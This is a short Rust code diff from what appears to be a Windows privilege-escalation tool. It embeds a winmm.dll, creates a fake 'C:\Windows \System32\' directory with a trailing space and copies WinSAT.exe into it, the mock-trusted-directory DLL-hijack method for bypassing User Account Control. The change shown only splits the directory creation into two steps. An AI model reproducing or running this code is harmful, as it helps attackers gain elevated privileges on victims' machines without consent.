@@ -4,7 +4,9 @@ static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.d
 
 pub fn main() {
   println!(r"[+] Creating fake directory C:\Windows \System32\...");
-  fs::create_dir_all(r"C:\Windows \System32\").unwrap();
+  fs::create_dir_all(r"C:\Windows \")
+    .and_then(|_| fs::create_dir_all(r"C:\Windows \System32\"))
+    .unwrap();
 
   println!(r"[+] Copying C:\Windows\System32\WinSAT.exe to C:\Windows \System32\WinSAT.exe...");
   fs::copy(
